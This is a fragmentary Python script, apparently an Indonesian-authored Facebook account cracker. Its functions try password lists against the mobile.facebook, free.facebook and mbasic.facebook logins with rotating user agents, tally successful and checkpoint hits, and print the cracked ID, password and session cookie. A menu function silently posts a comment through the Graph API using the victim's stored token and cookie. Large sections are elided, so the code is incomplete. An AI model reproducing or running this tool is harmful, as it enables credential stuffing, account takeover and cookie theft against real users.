...
def menu(bas_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={komentar}&access_token={token}", headers = {"cookie":cok})
	except IOError:
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'mobile.facebook[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}└──{K} {idf}|{pw} • {U}{tahun(idf)}{x}\n└──{B} {ua}{N}\n')     
				...
				print(f'\r{x}└──{H} {idf}|{pw} • {U}{tahun(idf)}{x}\n└──{H} {kuki}{x}\n└──{B} {ua}{N}\n')
...
def crackfree(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'free.facebook[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def crackmbasic(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'mbasic.facebook[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
